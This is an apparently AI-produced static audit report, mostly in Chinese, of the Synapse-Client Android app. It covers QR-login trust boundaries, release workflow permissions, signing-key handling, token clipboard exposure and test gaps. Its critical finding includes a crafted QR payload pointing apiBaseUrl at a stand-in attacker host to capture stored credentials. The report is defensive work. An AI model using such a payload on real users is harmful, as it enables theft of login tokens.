# Fuck My Shit Mountain Audit Report

**Project:** Synapse-Client  
**Audit mode:** full  
**Date:** 2026-07-05  
**Reviewer:** GPT-5 Codex

---

## 1. Executive Summary

本次审计按 full 模式覆盖 25 个维度。仓库当前可审计的一方产品代码主要是 `android/` 下的 Kotlin Android 客户端，配套 GitHub Actions、签名脚本、移动登录协议文档和 Trellis 项目规范；没有发现可运行的 TypeScript 全栈后端/前端源码。根据仓库策略，本次未运行本地构建、测试、安装或项目 lint，只做静态证据审计和报告 lint。

项目已经具备一些好的基础：Android manifest 禁止明文流量和系统备份，OkHttp 统一设置 HTTPS 与超时，JWT/client token 使用加密存储，API 错误消息避免回显请求值，CI 定义了 unit test 与 Android lint。阻塞稳定发布的核心风险在于信任边界和发布治理：扫码 payload 中的 `apiBaseUrl` 只要是 HTTPS 就会被信任，后续会把本机 JWT 或 `clientLoginToken` 发到该 host；发布 workflow 会在任意分支 push 后创建 latest release；签名脚本生成的 keystore 文件名与 `.gitignore` 不匹配。

建议优先修复扫码 host 绑定、发布分支/权限约束、签名材料忽略规则和令牌复制面，然后补齐 Repository/API/UI 级回归测试。当前整体评分为 5.1/B：功能骨架可用，但安全与发布维度不适合直接作为稳定公开发布基线。

### Score Dashboard

```
Security        █████░░░░░  4.5  C   高置信发现显示扫码确认会信任任意 HTTPS apiBaseUrl 并发送本机凭据，且令牌可被复制到剪贴板。
Stability       ██████░░░░  6.2  B   OkHttp 超时和崩溃报告存在，但凭据 JSON 解析失败与过期时间解析失败均走静默降级。
Performance     ███████░░░  7.2  A   未发现明确热路径性能缺陷，但 UI 大文件和未运行性能验证限制结论。
Testing         ████░░░░░░  3.8  C   测试仅覆盖少量纯函数/映射，缺少 Repository、网络、Compose UI、CI 发布策略和恶意 QR host 回归。
Maintainability █████░░░░░  5.2  B   模块边界基本清楚，但主 UI/ViewModel/崩溃页超过 500-1000 行，职责集中。
Design          █████░░░░░  5.0  B   HTTPS、加密存储、错误格式化是正向设计，但 fail-fast、SRP、最小权限在关键边界上不够。
Release         ████░░░░░░  3.9  C   workflow 对任意分支 push 自动发布 latest，权限过宽，签名脚本与忽略规则不一致。
─────────────────────────────────────
Overall         █████░░░░░  5.1  B
```

Each dimension scored 0.0-10.0. **Higher = better (10 = clean, 0 = shit mountain).** Scores are judgment-based, not formula-based. See `rubrics/scoring.md` for anchor descriptions.

### Finding Statistics

| Severity | Count | Confirmed | Suspected |
|----------|-------|-----------|-----------|
| Critical | 1 | 1 | 0 |
| High | 2 | 2 | 0 |
| Medium | 6 | 6 | 0 |
| Low | 1 | 1 | 0 |
| Info | 0 | 0 | 0 |
| **Total** | **10** | **10** | **0** |

## 2. Project Map

仓库结构如下：

- Android 应用：`android/app/src/main/java/com/synapse/mobile/`，入口为 `MainActivity` 与 `SynapseApplication`。
- 认证核心：`core/auth/`，包含 QR payload 解析、OkHttp API client、凭据加密存储、设备 ID、证书 pin 策略和 JSON 映射。
- 崩溃报告：`core/crash/` 与 `ui/CrashReportScreen.kt`，负责记录、持久化、展示和分享本地崩溃报告。
- Compose UI：`ui/SynapseMobileApp.kt`、`SynapseLoginViewModel.kt`、`QrScannerView.kt`、`TurnstileVerificationView.kt`。
- 发布与配置：`.github/workflows/synapse-android.yml`、`android/*.kts`、`setup-android-signing.ps1`、`.gitignore`。
- 文档：`docs/android-mobile-login-integration.md` 与 `android/README.md`。
- 工具/规范：`.trellis/`、`.agents/` 和本次使用的 `fuck-my-shit-mountain/` skill 目录；这些用于流程和报告生成，不视为 Android 产品运行代码。

关键运行流：

1. 应用启动：`SynapseApplication.attachBaseContext` 安装崩溃 handler，`onCreate` 初始化 MMKV；`MainActivity` 创建 `SynapseAuthRepository` 和 ViewModel。
2. 本客户端登录：Compose 表单收集用户名/密码/Turnstile token；Repository 调 `/api/auth/login`，必要时走 TOTP/Passkey，再签发并保存 `clientLoginToken`。
3. 扫码网页登录：深链或相机扫描填入 `synapse://mobile-login` payload；Parser 校验 scheme/host/HTTPS/过期时间；Repository 使用 payload 中的 `apiBaseUrl` 调 `/challenge/scan` 与 `/challenge/confirm`。
4. 凭据持久化：JWT 与 `clientLoginToken` 存入 MMKV 加密 store，MMKV crypt key 放在 `EncryptedSharedPreferences`；设备 ID 放在普通 `SharedPreferences`。
5. 发布：GitHub Actions 在 push/pull_request/workflow_dispatch 下运行 unit test、Android lint、release APK 构建、资产生成与 release 上传。

覆盖说明：已用 `rg --files` 建立文件清单，重点检查 Android Kotlin 源码、测试、manifest、Gradle、workflow、签名脚本、文档和本地敏感文件状态。排除了 `.git`、依赖目录、构建产物、缓存、skill 模板/示例本身和二进制内容。未运行项目构建、测试、安装、Gradle lint 或依赖安装，这是仓库策略要求。

### Coverage Matrix

| Dimension | Coverage | Evidence inspected | Exclusions / limits |
|-----------|----------|--------------------|---------------------|
| Architecture | High | `android/app/src/main/java/**`, line counts, entry points, UI/ViewModel/core boundaries | 未运行架构工具；基于静态代码 |
| Security | High | Auth repository/API/parser/store, manifest, network config, workflow secrets, signing script | 未动态抓包或攻击复现 |
| Stability | Medium | OkHttp timeout, crash reporter, store fallback, ViewModel action wrapper | 未运行故障注入/设备测试 |
| Performance | Medium | file size, UI composition shape, network calls, dependency manifest | 未运行 profiler 或 APK size 分析 |
| Testing | High | `android/app/src/test/**`, Gradle test deps, CI test steps | 未执行测试 |
| Maintainability | High | Kotlin source line counts, imports, responsibilities, docs | 未用复杂度工具计算 cyclomatic score |
| Design | High | trust boundaries, SRP/file-size, fail-fast, least privilege checks | 静态判断，未做用户研究 |
| Release | High | `.github/workflows/synapse-android.yml`, Gradle release config, signing script | 未访问 GitHub run history |
| Documentation | Medium | `android/README.md`, `docs/android-mobile-login-integration.md`, comments | 未校验后端真实接口实现 |
| Configuration | High | `android/app/build.gradle.kts`, workflow env/secrets, manifest | 未检查远程 repository secrets 实际值 |
| Observability | Medium | crash reporting code, API error formatter, CI artifacts | 未检查运行日志平台/告警 |
| Data Integrity | Medium | credential store, account JSON, expiration parsing, multi-account paths | 未模拟崩溃/存储损坏 |
| Privacy | Medium | token storage/copy/share, device ID, crash report contents | 未做隐私政策/合规文档审查 |
| Accessibility | Medium | Compose labels/buttons/dialogs/scanner error states | 未运行 TalkBack、contrast 或 UI automation |
| Supply Chain | High | Actions, Gradle repos/versions, signing, artifacts/checksums, ignored files | 未做 dependency CVE audit 或 artifact provenance 验证 |
| Cost | Medium | external calls, timeouts, QR scanner/ML Kit, CI behavior | 未检查 GitHub Actions billing/runtime |
| AI-Safety | Not assessed | 检查未发现 LLM、RAG、agent tool、model call 运行面 | 项目不包含 AI/LLM 运行逻辑 |
| Fallback | High | `runCatching`, `getOrDefault`, defaults, release/config fallbacks | 未运行异常路径 |
| Testing Authenticity | High | test files and CI commands | 未运行 mutation/coverage 工具 |
| Type Safety | Medium | Kotlin models, nullable handling, JSONObject parsing, stringly typed JSON | 未运行 compiler/type-check |
| Frontend State | High | Compose state, `SynapseUiState`, ViewModel mutations, dialogs | 未运行 UI tests |
| Backend API | Medium | Android API client contract and docs | 仓库没有后端实现可审计 |
| Dependency Weight | Medium | Gradle dependencies, lock/wrapper absence, Material icons/ML Kit | 未生成 dependency tree/APK size |
| Code Consistency | Medium | naming, imports, file structure, error handling patterns | 未运行 ktlint/detekt |
| Comment Coverage | Medium | docs, README, inline comments, public contracts | 未做全量文档准确性验证 |

## 3. Top Risks

| Priority | Finding | Severity | Summary |
|----------|---------|----------|---------|
| 1 | Untrusted QR `apiBaseUrl` can receive stored credentials | Critical | QR payload 只校验 HTTPS，确认网页登录时会把 JWT 或 `clientLoginToken` 发给 payload 指定的 host。 |
| 2 | Workflow publishes latest releases from every branch push | High | `push.branches: "**"` 加 `Automatic release` 条件会让任意分支 push 成为 latest release 来源。 |
| 3 | Signing script and ignore rules can leave release keystore commit-ready | High | 脚本生成 `synapse-release.jks`，但 `.gitignore` 只忽略 `nexai-release.jks`。 |
| 4 | SML token preview still copies the full token | Medium | UI 显示预览但把完整 `clientLoginToken` 传给剪贴板。 |
| 5 | Malformed client-token expiry is treated as not expired | Medium | 过期时间解析失败时返回 false，令牌继续被视为有效。 |
| 6 | Corrupt credential JSON silently drops all stored accounts | Medium | `parseAccounts` 捕获异常后返回空列表，没有告警或恢复路径。 |
| 7 | Production certificate pinning can fail open | Medium | pin 配置默认空、require 默认 false，CI 未要求发布 secrets 存在。 |
| 8 | Critical auth flows lack Repository/network/UI regression tests | Medium | 测试没有覆盖恶意 QR host、token exchange、multi-account confirm、ViewModel 状态机。 |
| 9 | UI and ViewModel files exceed maintainable responsibility limits | Medium | `SynapseMobileApp.kt` 1122 行，`SynapseLoginViewModel.kt` 527 行。 |
| 10 | Supply-chain reproducibility is incomplete | Low | 未见 Gradle wrapper/lockfile/SBOM/provenance，Actions 以 tag 引用。 |

## 4. Detailed Findings

### Finding: Untrusted QR `apiBaseUrl` can receive stored credentials

- Severity: Critical
- Confidence: High
- Category: Security
- Status: Confirmed
- Affected area: QR web login trust boundary and credential forwarding
- Evidence:
  - File: `android/app/src/main/java/com/synapse/mobile/core/auth/SynapseQrPayloadParser.kt:16-31`
  - Function / Module: `SynapseQrPayloadParser.parse`
  - Relevant behavior: Parser 从 QR query 读取 `apiBaseUrl`，只要求它以 `https://` 开头。
  - File: `android/app/src/main/java/com/synapse/mobile/core/auth/SynapseAuthRepository.kt:190-221`
  - Function / Module: `parseAndMarkScanned`, `confirmQrLogin`
  - Relevant behavior: Repository 使用 `apiFor(payload.apiBaseUrl)` 标记扫码并确认登录。
  - File: `android/app/src/main/java/com/synapse/mobile/core/auth/SynapseMobileLoginApi.kt:47-68`
  - Function / Module: `confirmWithJwt`, `confirmWithClientToken`
  - Relevant behavior: 确认请求会发送 Authorization Bearer JWT 或请求体中的 `clientLoginToken`。
- Problem: QR payload 是外部输入，但它可以决定 API host。只要攻击者生成 `synapse://mobile-login?...&apiBaseUrl=https://attacker.example` 并诱导用户扫描，客户端会向攻击者 host 发送本机长期登录令牌或 JWT。
- Why it matters: 这是认证信任边界错误。HTTPS 只能保证连接加密，不能证明 host 属于 Synapse；一旦凭据发给攻击者，服务端撤销前可被换取或确认会话。
- Realistic failure scenario: 用户在钓鱼网页看到“网页登录二维码”，用已授权 Android 客户端扫描并点击确认；客户端显示目标站点但没有强制阻止未知 host；确认请求把 `clientLoginToken` 发到攻击者服务，攻击者保存后尝试兑换或确认登录。
- Minimal fix: 将 QR `apiBaseUrl` 绑定到 `defaultBaseUrl` 或受信任 allowlist；未知 host 必须 hard fail。更稳妥的是 QR payload 只带 session/token，API origin 来自应用配置。
- Better long-term fix: 对 QR payload 做服务端签名或挑战绑定，客户端校验 issuer/audience/host；确认请求只允许向配置的 Synapse origin 发送凭据。
- Regression test suggestion: 添加 parser/repository 测试：`apiBaseUrl=https://attacker.example` 时确认路径不得创建该 host 的 API client，也不得发送 JWT/client token。
- Estimated effort: 0.5-1 天

### Finding: Workflow publishes latest releases from every branch push

- Severity: High
- Confidence: High
- Category: Release
- Status: Confirmed
- Affected area: GitHub Actions release governance
- Evidence:
  - File: `.github/workflows/synapse-android.yml:3-19`
  - Function / Module: workflow triggers and permissions
  - Relevant behavior: workflow 在所有分支 push 时触发，并给整个 job `contents: write`。
  - File: `.github/workflows/synapse-android.yml:209-220`
  - Function / Module: `Automatic release`
  - Relevant behavior: 只要 workflow 成功且事件不是 pull_request，就创建非 prerelease、`make_latest: true` 的 GitHub release。
- Problem: 任意分支 push 都可能产出 latest stable release，而不是只允许 main/tag/manual release。权限也在 workflow 顶层授予，测试、lint 和构建阶段同样持有写权限。
- Why it matters: 发布物的来源边界不清晰会造成供应链风险。功能分支、临时分支或错误 push 可能被用户当作稳定版本下载。
- Realistic failure scenario: 开发者把尚未审核的 Android 改动 push 到 feature 分支；CI 成功后自动发布 `v1.0.<run>-<hash>` 并标记 latest，用户下载了未经过发布审批的 APK。
- Minimal fix: 将 release job 限制到 `main`、受保护 release 分支或 semver tag；默认 permissions 设为 `contents: read`，仅 release job/step 需要时赋 `contents: write`。
- Better long-term fix: 拆分 verify 与 release workflow；release 只接受 tag/workflow_dispatch，并要求环境保护、审批、artifact provenance、签名校验和 release notes 审核。
- Regression test suggestion: 增加 workflow policy 检查脚本，解析 YAML 并断言 release step 有 branch/tag guard，且顶层 permissions 不为 `contents: write`。
- Estimated effort: 2-4 小时

### Finding: Signing script and ignore rules can leave release keystore commit-ready

- Severity: High
- Confidence: High
- Category: Supply Chain
- Status: Confirmed
- Affected area: Android release signing material lifecycle
- Evidence:
  - File: `setup-android-signing.ps1:202-250`
  - Function / Module: signing setup script
  - Relevant behavior: 脚本生成 `synapse-release.jks`，再写出 `keystore_base64.txt`。
  - File: `setup-android-signing.ps1:337-341`
  - Function / Module: completion notice
  - Relevant behavior: 脚本提示 keystore 文件已在 `.gitignore` 中。
  - File: `.gitignore:29-33`
  - Function / Module: root ignore rules
  - Relevant behavior: 当前只忽略 `nexai-release.jks`、`nexai-release.jks.bak`、`keystore_base64.txt` 和 skill 目录，未忽略 `synapse-release.jks`。
  - File: `keystore_base64.txt`
  - Function / Module: local workspace artifact
  - Relevant behavior: 本地工作区存在该敏感临时文件；内容未读取、未输出。
- Problem: 脚本生成的 release keystore 文件名与忽略规则不一致，会让签名私钥文件处于可被 `git add` 的状态；同时临时 base64 文件会留在工作区，依赖用户手动删除。
- Why it matters: Android release keystore 泄露后无法简单撤回，攻击者可签发伪装升级包或破坏用户对发布渠道的信任。
- Realistic failure scenario: 运行签名脚本后没有删除 `synapse-release.jks`，后续提交时把它误加入仓库；即使很快删除，历史和远端副本也可能已泄露，需要轮换签名策略。
- Minimal fix: `.gitignore` 增加 `synapse-release.jks` 和 `synapse-release.jks.bak`；脚本在生成前校验 ignore 覆盖，并默认删除 `keystore_base64.txt`，只在显式参数下保留。
- Better long-term fix: 将 keystore 生成和 GitHub secret 写入移动到临时目录；使用 OS secret store 或 CI 手动导入流程，禁止在仓库根目录落盘。
- Regression test suggestion: 添加脚本静态测试，断言 `$keystoreFile` 文件名存在于 `.gitignore`，并断言临时文件默认清理。
- Estimated effort: 1-2 小时

### Finding: SML token preview still copies the full token

- Severity: Medium
- Confidence: High
- Category: Privacy
- Status: Confirmed
- Affected area: Compose credential summary and clipboard handling
- Evidence:
  - File: `android/app/src/main/java/com/synapse/mobile/ui/SynapseMobileApp.kt:843-851`
  - Function / Module: `CredentialSummary`
  - Relevant behavior: UI 展示 `clientLoginTokenPreview`，但 `copyValue` 传入完整 `active.clientLoginToken`。
  - File: `android/app/src/main/java/com/synapse/mobile/ui/SynapseMobileApp.kt:933-979`
  - Function / Module: `CopyableLine`
  - Relevant behavior: 点击复制按钮会将 `copyValue` 写入系统剪贴板。
  - File: `docs/android-mobile-login-integration.md:337-340`
  - Function / Module: mobile login contract
  - Relevant behavior: 文档要求弹窗不得展示或复制 JWT、`clientLoginToken` 或 QR `scanToken`。
- Problem: 令牌展示做了预览，但复制路径仍暴露完整 `clientLoginToken`。这与文档中“不得复制 clientLoginToken”的安全契约不一致。
- Why it matters: 剪贴板是弱隔离边界，用户也容易把复制内容误粘贴到聊天、issue 或日志中。`clientLoginToken` 是长期设备凭据，泄露后的影响高于普通 UI 文本。
- Realistic failure scenario: 用户在“本地会话”或“网页登录使用的本客户端账号”中点击复制 SML 令牌，随后把剪贴板内容粘贴到工单或被其他输入法/剪贴板同步工具读取。
- Minimal fix: SML token 行禁用复制，或只允许复制预览值；复制按钮只用于账号 ID、邮箱、设备 ID 等非凭据字段。
- Better long-term fix: 引入 `SensitiveText`/`CopyPolicy` UI 组件，凭据字段默认不可复制，必须经过显式安全确认和短期剪贴板清理策略。
- Regression test suggestion: 添加 Compose/UI 或 ViewModel contract 测试，断言 `clientLoginToken` 不会作为 clipboard payload 暴露。
- Estimated effort: 1-2 小时

### Finding: Malformed client-token expiry is treated as not expired

- Severity: Medium
- Confidence: High
- Category: Data Integrity
- Status: Confirmed
- Affected area: Client token expiration enforcement
- Evidence:
  - File: `android/app/src/main/java/com/synapse/mobile/core/auth/AuthModels.kt:112-115`
  - Function / Module: `StoredSynapseAccount.isClientLoginTokenExpired`
  - Relevant behavior: `Instant.parse` 失败时 `getOrDefault(false)`，UI/状态认为 token 未过期。
  - File: `android/app/src/main/java/com/synapse/mobile/core/auth/SynapseCredentialStore.kt:147-160`
  - Function / Module: `revokeExpiredClientTokens`
  - Relevant behavior: 只在 `isClientLoginTokenExpiredAt(now)` 为 true 时清理 token。
  - File: `android/app/src/main/java/com/synapse/mobile/core/auth/SynapseCredentialStore.kt:310-313`
  - Function / Module: `isClientLoginTokenExpiredAt`
  - Relevant behavior: 存储层同样在时间解析失败时返回 false。
- Problem: 过期时间是服务端返回并持久化的数据，一旦格式损坏、服务端变更或迁移错误，客户端会 fail-open，把无法证明有效期的 token 当作未过期。
- Why it matters: 授权凭据的有效期应 fail-closed。解析失败继续使用会扩大被盗或过期凭据的可用窗口，也让用户界面显示错误状态。
- Realistic failure scenario: 后端一次发布把 `expiresAt` 写成非 ISO 字符串，客户端保存后启动；本地过期检查解析失败并返回 false，继续用旧 `clientLoginToken` 做静默登录或网页登录确认。
- Minimal fix: 解析失败时视为已过期并清理本地 JWT/client token，同时给用户明确错误。
- Better long-term fix: 保存时就解析为 `Instant` 或 epoch millis；持久化 schema 版本化并加入迁移/校验。
- Regression test suggestion: 添加 `revokeExpiredClientTokens` 测试：`clientLoginTokenExpiresAt="not-a-date"` 应清理 token 并要求重新授权。
- Estimated effort: 1-2 小时

### Finding: Corrupt credential JSON silently drops all stored accounts

- Severity: Medium
- Confidence: High
- Category: Stability
- Status: Confirmed
- Affected area: Credential account store fallback
- Evidence:
  - File: `android/app/src/main/java/com/synapse/mobile/core/auth/SynapseCredentialStore.kt:183-192`
  - Function / Module: `loadAccounts`
  - Relevant behavior: 读取 `KEY_ACCOUNTS_JSON` 后调用 `parseAccounts`，空结果会回退 legacy account 或空列表。
  - File: `android/app/src/main/java/com/synapse/mobile/core/auth/SynapseCredentialStore.kt:195-215`
  - Function / Module: `parseAccounts`
  - Relevant behavior: JSON 解析或字段处理异常被 `runCatching` 吞掉，并 `getOrDefault(emptyList())`。
- Problem: 凭据存储损坏或 schema 不兼容时，代码没有保留错误、没有提示用户、没有备份恢复，而是把账号列表当成空。
- Why it matters: 静默丢弃账号列表会让用户看起来“凭据消失”，后续保存新账号可能覆盖原始数据，增加支持和数据恢复难度。
- Realistic failure scenario: MMKV 中的 `accounts_json` 因旧版本 bug 或写入中断损坏；新版本启动时解析失败返回空，用户重新登录后 `saveAccounts` 写入新列表，原多账号凭据不可恢复。
- Minimal fix: 解析失败时保留原始数据、记录安全错误状态并提示重新授权，不要把异常等同于空列表。
- Better long-term fix: 凭据 store 引入 schema version、备份槽和迁移事务；账户列表与 active account 一次性提交。
- Regression test suggestion: 添加 credential store 测试：损坏 JSON 不应被静默当作空账号，且应暴露可恢复错误。
- Estimated effort: 0.5-1 天

### Finding: Production certificate pinning can fail open

- Severity: Medium
- Confidence: High
- Category: Configuration
- Status: Confirmed
- Affected area: TLS pinning configuration and release CI
- Evidence:
  - File: `android/app/build.gradle.kts:50-59`
  - Function / Module: BuildConfig fields
  - Relevant behavior: `SYNAPSE_CERTIFICATE_PINS` 默认空字符串，`SYNAPSE_REQUIRE_CERTIFICATE_PINS` 默认 false；非法布尔值也回退 false。
  - File: `.github/workflows/synapse-android.yml:54-70`
  - Function / Module: unit test and lint env
  - Relevant behavior: CI 将 pin secrets 传入测试/lint，但没有检查这些 secrets 必须存在。
  - File: `.github/workflows/synapse-android.yml:105-116`
  - Function / Module: release build env
  - Relevant behavior: release build 也传入 pin secrets，但只强制检查签名 secrets。
  - File: `android/app/src/main/java/com/synapse/mobile/core/auth/SynapseSecureOkHttpFactory.kt:17-29`
  - Function / Module: `create`
  - Relevant behavior: 只有 `requireCertificatePins=true` 且 pins 为空时才 fail-fast。
- Problem: 生产发布可以在没有证书 pin 的情况下成功构建；配置拼写错误或 secret 缺失会降级为普通 TLS，而不是明确失败。
- Why it matters: README 声明 pinning 是可选的，但如果稳定发布依赖 pinning 抵御企业代理/恶意 CA/配置劫持，当前默认会隐藏配置错误。
- Realistic failure scenario: 仓库 secret `SYNAPSE_REQUIRE_CERTIFICATE_PINS` 未配置或拼写成非布尔值；release 成功发布，用户以为启用了 pinning，但实际只有系统 CA 校验。
- Minimal fix: 对 release job 增加 pin 配置断言；发布构建中默认要求 `SYNAPSE_REQUIRE_CERTIFICATE_PINS=true` 且 pin 列表非空。
- Better long-term fix: 将安全配置分 dev/release flavor；release flavor 对缺失安全配置 fail-fast，并在 release manifest 记录 pinning 状态。
- Regression test suggestion: 添加 Gradle/workflow policy 测试，断言 release 构建缺少 pin secrets 时失败。
- Estimated effort: 2-4 小时

### Finding: Critical auth flows lack Repository/network/UI regression tests

- Severity: Medium
- Confidence: High
- Category: Testing
- Status: Confirmed
- Affected area: Authentication, QR login, UI state, CI confidence
- Evidence:
  - File: `android/app/src/test/java/com/synapse/mobile/core/auth/SynapseQrPayloadParserTest.kt:7-37`
  - Function / Module: QR parser tests
  - Relevant behavior: 只测试 valid payload、wrong scheme、HTTP API base URL；没有恶意 HTTPS host/allowlist 测试。
  - File: `android/app/build.gradle.kts:142-143`
  - Function / Module: test dependencies
  - Relevant behavior: test deps 只有 JUnit 与 org.json。
  - File: `.github/workflows/synapse-android.yml:54-70`
  - Function / Module: verification jobs
  - Relevant behavior: CI 运行 unit tests 和 Android lint，但没有 instrumented/Compose/UI/network contract 测试。
  - File: `android/app/src`
  - Function / Module: test directory inventory
  - Relevant behavior: 未发现 `androidTest` 目录。
- Problem: 当前测试主要验证 JSON 映射和格式化，无法保护最关键的登录状态机、网络请求目标、凭据持久化、剪贴板、Turnstile、QR 确认弹窗和发布策略。
- Why it matters: 认证客户端的风险集中在跨模块流程；仅测纯函数会产生“绿色但关键路径未保护”的假信心。
- Realistic failure scenario: 修复 UI 时不小心绕过多账号选择或允许未知 `apiBaseUrl`，单元测试仍然通过，因为 Repository 和 ViewModel 流程没有 fake API/MockWebServer 覆盖。
- Minimal fix: 添加 Repository 级 fake API/MockWebServer 测试，覆盖 QR host、401 fallback、multi-account selection、expired/malformed token expiry。
- Better long-term fix: 引入 Robolectric/Compose UI test 或 instrumented tests；为 GitHub workflow 策略和 signing script 增加静态 contract tests。
- Regression test suggestion: 第一批测试应覆盖本报告 F1-F7，每个发现至少一个失败先行的回归用例。
- Estimated effort: 2-4 天

### Finding: UI and ViewModel files exceed maintainable responsibility limits

- Severity: Medium
- Confidence: High
- Category: Maintainability
- Status: Confirmed
- Affected area: Compose UI and presentation state management
- Evidence:
  - File: `android/app/src/main/java/com/synapse/mobile/ui/SynapseMobileApp.kt:1-1122`
  - Function / Module: Synapse Compose UI
  - Relevant behavior: 单文件包含主 Scaffold、登录页、QR 页、账号选择、本地会话、凭据摘要、复制行、对话框和通用组件。
  - File: `android/app/src/main/java/com/synapse/mobile/ui/SynapseLoginViewModel.kt:1-527`
  - Function / Module: `SynapseLoginViewModel`
  - Relevant behavior: 单个 ViewModel 处理登录、Turnstile、TOTP、Passkey、JWT 导入、QR 扫描、账号选择、撤销与通用 action wrapper。
  - File: `android/app/src/main/java/com/synapse/mobile/ui/CrashReportScreen.kt:1-575`
  - Function / Module: crash report UI
  - Relevant behavior: 崩溃报告页面、分享、文件导出和多个 UI 组件集中在同一文件。
- Problem: 文件超过原则阈值，且聚合多个变化原因。安全逻辑、状态转换和 UI 组件离得太近，增加误改关键流程的风险。
- Why it matters: 登录/扫码是安全敏感路径；过大的 UI/ViewModel 文件会让审查者难以确认一次变更是否影响凭据、剪贴板或 QR 信任边界。
- Realistic failure scenario: 添加新登录方式时修改 `SynapseLoginViewModel`，无意中复用 `launchAction` 清空错误/状态，导致 Turnstile 或 QR 状态被错误重置；测试缺口又无法及时捕获。
- Minimal fix: 先按页面拆分 `LoginPanel`、`QrPanel`、`SessionPanel`、`CredentialSummary` 到独立文件；将 QR 确认状态机抽成可测试 coordinator。
- Better long-term fix: 将认证 use case、QR use case、credential presentation model 与 Compose UI 分层，ViewModel 只编排状态。
- Regression test suggestion: 拆分前后添加 ViewModel 状态机测试，保证登录、二次验证、QR 标记/确认和账号选择行为不变。
- Estimated effort: 1-3 天

### Finding: Supply-chain reproducibility is incomplete

- Severity: Low
- Confidence: High
- Category: Release
- Status: Confirmed
- Affected area: Dependency and artifact provenance
- Evidence:
  - File: `android/settings.gradle.kts:1-15`
  - Function / Module: repository configuration
  - Relevant behavior: 只配置 Google、Maven Central、Gradle Plugin Portal；未见 dependency verification 或 lockfile。
  - File: `android`
  - Function / Module: project root inventory
  - Relevant behavior: 未发现 Gradle wrapper 或 dependency lock 文件。
  - File: `.github/workflows/synapse-android.yml:29-41`
  - Function / Module: external actions and Gradle setup
  - Relevant behavior: Actions 以 `@v5/@v4` 等 tag 引用，Gradle 版本由 action 拉取。
  - File: `.github/workflows/synapse-android.yml:140-199`
  - Function / Module: release asset preparation
  - Relevant behavior: 生成 checksums 与 JSON manifest，但未见 APK 签名验证、SBOM 或 SLSA/provenance。
- Problem: 构建依赖和发布产物有基本 checksum，但缺少更强的可复现和来源证明；action tag 不是不可变引用。
- Why it matters: 这不是当前功能 bug，但会降低公开发布的可追溯性和供应链审计能力。
- Realistic failure scenario: 上游 action tag 或插件仓库行为变化，CI 仍成功构建但无法证明产物对应预期依赖集合。
- Minimal fix: 引入 Gradle wrapper 或明确的 wrapper 策略、dependency locking/verification metadata；将 release 相关第三方 action pin 到 commit SHA。
- Better long-term fix: 生成 SBOM、SLSA provenance，发布前验证 APK 签名和 manifest checksum，并记录构建环境。
- Regression test suggestion: 添加 CI policy 检查，断言 release workflow action 使用 SHA pin，dependency verification 文件存在。
- Estimated effort: 0.5-1 天

## 5. Architecture Concerns

- Coverage: High
- Inspected evidence: Android package layout, `MainActivity`, `SynapseApplication`, `core/auth`, `core/crash`, `ui`, Gradle modules
- Exclusions / limits: 未运行架构图生成器；仓库没有后端实现可审计

| Finding | Subtype | Impact |
|---------|---------|--------|
| F1 | BoundaryContract | QR payload 让外部输入控制 API origin，破坏认证边界。 |
| F8 | EvolutionRisk | 缺少流程测试使认证状态机变化风险高。 |
| F9 | ModuleBoundary | UI/ViewModel 文件职责集中，变更影响面过大。 |

Verified checklist:

- `core/auth` 和 `core/crash` 与 Compose UI 大体分层。
- Manifest 和网络安全配置集中在 Android 资源层。
- 主要架构缺陷在边界契约和文件职责，不是需要全量重写。

## 6. Security Concerns

- Coverage: High
- Inspected evidence: QR parser, Repository, API client, credential store, manifest, network config, signing script, workflow secrets
- Exclusions / limits: 未执行动态攻击复现、证书 pin 实测或远端 secret 检查

| Finding | Severity | Security impact |
|---------|----------|-----------------|
| F1 | Critical | 本机 JWT/client token 可被发送到攻击者 HTTPS host。 |
| F3 | High | release keystore 可能被误提交或残留。 |
| F4 | Medium | 长期 SML token 可复制到剪贴板。 |
| F7 | Medium | 发布构建可无声降级为无 pinning。 |

Verified checklist:

- `AndroidManifest.xml` 设置 `allowBackup="false"` 与 `usesCleartextTraffic="false"`。
- `network_security_config.xml` 禁止 cleartext。
- `SynapseSecureOkHttpFactory` 要求 API URL scheme 为 HTTPS 并配置超时。
- API 错误格式化不回显请求值。

## 7. Stability Concerns

- Coverage: Medium
- Inspected evidence: timeout, crash reporter, credential store fallback, ViewModel action wrapper, QR scanner cleanup
- Exclusions / limits: 未做设备矩阵、离线、进程杀死或存储损坏运行测试

| Finding | Severity | Stability impact |
|---------|----------|------------------|
| F5 | Medium | 无法解析过期时间时继续使用 token。 |
| F6 | Medium | 凭据 JSON 损坏时静默掉账号列表。 |
| F8 | Medium | 流程级故障缺少自动化保护。 |

Verified checklist:

- OkHttp connect/read/write timeout 均为 8 秒。
- 崩溃报告可写入多个 app-private 目录。
- QR analyzer executor 在 `DisposableEffect` 中 shutdown。

## 8. Performance Concerns

- Coverage: Medium
- Inspected evidence: file sizes, scanner flow, OkHttp sync calls on IO dispatcher, Gradle deps
- Exclusions / limits: 未运行 profiler、startup benchmark、APK size 或 memory test

| Finding | Severity | Performance impact |
|---------|----------|--------------------|
| F9 | Medium | 大型 Compose 文件增加重组/审查定位成本，但未确认运行时瓶颈。 |
| F10 | Low | 无 APK size/SBOM 基线，依赖重量影响不可见。 |

Verified checklist:

- 网络请求在 `Dispatchers.IO` 中执行。
- QR scanner 使用 `STRATEGY_KEEP_ONLY_LATEST`，避免积压帧。
- Release 启用 minify 与 shrink resources。

## 9. Testing Gaps

- Coverage: High
- Inspected evidence: `android/app/src/test/**`, Gradle test deps, CI unit/lint steps
- Exclusions / limits: 未执行测试；没有 coverage report 可参考

| Finding | Severity | Missing confidence |
|---------|----------|--------------------|
| F1 | Critical | 没有测试未知 HTTPS `apiBaseUrl` 必须被拒绝。 |
| F4 | Medium | 没有测试敏感 token 不进入 clipboard payload。 |
| F5 | Medium | 没有测试 malformed expiry fail-closed。 |
| F6 | Medium | 没有测试损坏凭据 store 的恢复语义。 |
| F8 | Medium | Repository/network/UI/CI policy 覆盖缺失。 |

Verified checklist:

- 现有测试对 JSON 映射、token 预览、错误格式化和 QR 基本解析有价值。
- 测试没有过度 mocking 的明显证据，因为测试数量很少且主要是纯函数。

## 10. Maintainability Concerns

- Coverage: High
- Inspected evidence: Kotlin line counts, package layout, ViewModel/UI responsibilities, docs
- Exclusions / limits: 未运行 detekt/ktlint 或复杂度工具

| Finding | Severity | Maintainability impact |
|---------|----------|------------------------|
| F8 | Medium | 关键流程测试缺失使安全修复难以安全迭代。 |
| F9 | Medium | 文件和 ViewModel 职责集中，代码审查成本高。 |
| F10 | Low | 发布和依赖策略缺少机器可检查基线。 |

Verified checklist:

